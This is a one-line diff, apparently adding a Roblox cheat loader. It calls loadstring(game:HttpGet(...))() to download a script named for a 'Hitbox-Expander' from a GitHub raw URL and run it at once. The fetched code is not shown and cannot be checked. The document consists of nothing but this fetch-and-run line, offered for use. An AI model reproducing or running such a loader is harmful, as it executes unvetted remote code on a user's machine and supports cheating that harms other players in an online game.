@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/example-prog/Hitbox-Expander/refs/heads/main/RScripter"))()
